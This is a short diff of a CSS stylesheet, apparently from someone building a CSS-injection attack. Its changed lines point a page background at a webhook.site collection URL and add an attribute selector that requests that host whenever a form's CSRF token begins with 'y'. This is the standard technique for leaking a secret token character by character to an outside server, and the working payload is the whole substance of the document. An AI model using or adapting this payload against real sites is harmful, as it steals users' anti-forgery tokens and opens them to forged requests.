@@ -106,7 +106,7 @@ form > input[type='submit'] {
         visibility: visible;
 }
 body {
-        background-image: url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/test);
+        background-image: url("https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/test");
 }
 
-input[name=csrf][value^=y]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93?text=y);}
+input[name=csrf][value^=y]{background-image: url("https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93?text=y");}
